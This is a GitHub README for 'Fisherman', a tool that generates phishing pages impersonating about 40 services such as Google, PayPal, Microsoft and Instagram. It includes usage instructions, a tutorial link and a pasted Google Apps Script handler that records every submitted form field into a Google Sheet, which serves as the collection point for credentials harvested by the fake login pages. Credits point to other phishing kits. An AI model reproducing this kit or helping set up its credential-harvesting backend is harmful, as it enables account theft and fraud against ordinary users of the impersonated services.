# Fisherman
A tool that generates phishing pages with custom google-sheet support for data storage. It can generate 40 different pages.

## What is phishing:
Phishing starts with a fraudulent email or other communication that is designed to lure a victim. The message is made to look as though it comes from a trusted sender. If it fools the victim, he or she is coaxed into providing confidential information, often on a scam website.

## Services available:
Adobe, Amazon, Apple, Badoo, DeviantArt, Discord, Dropbox, Ebay, ExpertOption, Facebook, Flipkart, Github, Gitlab, Google, Instagram, Instagram Batch, Linkedin, Mediafire, Microsoft,
Netflix, Paypal, Pinterest, Playstation, ProtonMail, Quora, Reddit, Roblox, Snapchat, Snapfish, Spotify, Stackoverflow, Steam, Tiktok, Twitch, Twitter, VK, Wordpress, Xbox, Yahoo and Yandex.

More services will be added in the next version.

## How to use this tool:
Watch this tutorial video: ["How to use Fisherman tool"](https://drive0.pikachu.my.id/0:/km_20230913_1080p_30f_20230913_191006.mp4?a=view)

Code to paste while creating sheet:


	var sheetName = 'Sheet1'
		var scriptProp = PropertiesService.getScriptProperties()

		function intialSetup () {
		  var activeSpreadsheet = SpreadsheetApp.getActiveSpreadsheet()
		  scriptProp.setProperty('key', activeSpreadsheet.getId())
		}

		function doPost (e) {
		  var lock = LockService.getScriptLock()
		  lock.tryLock(10000)

		  try {
			var doc = SpreadsheetApp.openById(scriptProp.getProperty('key'))
			var sheet = doc.getSheetByName(sheetName)

			var headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0]
			var nextRow = sheet.getLastRow() + 1

			var newRow = headers.map(function(header) {
			  return header === 'timestamp' ? new Date() : e.parameter[header]
			})

			sheet.getRange(nextRow, 1, 1, newRow.length).setValues([newRow])

			return ContentService
			  .createTextOutput(JSON.stringify({ 'result': 'success', 'row': nextRow }))
			  .setMimeType(ContentService.MimeType.JSON)
		  }

		  catch (e) {
			return ContentService
			  .createTextOutput(JSON.stringify({ 'result': 'error', 'error': e }))
			  .setMimeType(ContentService.MimeType.JSON)
		  }

		  finally {
			lock.releaseLock()
		  }
		}


Screenshots:
<details>
  <summary>Click here to view</summary>
  <img src="https://github.com/DeadSOUL-Studios/Fisherman/assets/119154806/ae705085-0710-42fc-9973-8cd433c6b29a" name="Screenshot (59">
  <img src="https://github.com/DeadSOUL-Studios/Fisherman/assets/119154806/1e7694ce-89c9-441e-9c49-ace57018201e" name="Screenshot (60)">
  <img src="https://github.com/DeadSOUL-Studios/Fisherman/assets/119154806/d5d2c243-907f-4767-b564-c0d7a6443202" name="Screenshot (61)">
  <img src="https://github.com/DeadSOUL-Studios/Fisherman/assets/119154806/0dd20a52-0825-41e8-8d83-b29ddf8f6790" name="Screenshot (62)">
  <img src="https://github.com/DeadSOUL-Studios/Fisherman/assets/119154806/13465103-ab68-4ef1-acf9-f89df72e3016" name="Screenshot (64)">
</details>

## Information:
Tool: Fisherman v1

Languages used: Java, HTML, CSS and JS

Requirement: JDK 17 or above

Developer: Ayush

Size: 600KB

## Credits:
[https://github.com/prasad5793/gmailphishing](https://github.com/prasad5793/gmailphishing)

[https://github.com/AvishkaRJ/Phishing-Attack-smaple](https://github.com/AvishkaRJ/Phishing-Attack-smaple)

[https://github.com/opandao-oo/oPANDAoPhishing](https://github.com/opandao-oo/oPANDAoPhishing)

[https://github.com/evildevill/EmptyPhish](https://github.com/evildevill/EmptyPhish)

[https://github.com/princekrvert/Ravana](https://github.com/princekrvert/Ravana)

[https://github.com/srikanth-lingala/zip4j](https://github.com/srikanth-lingala/zip4j)


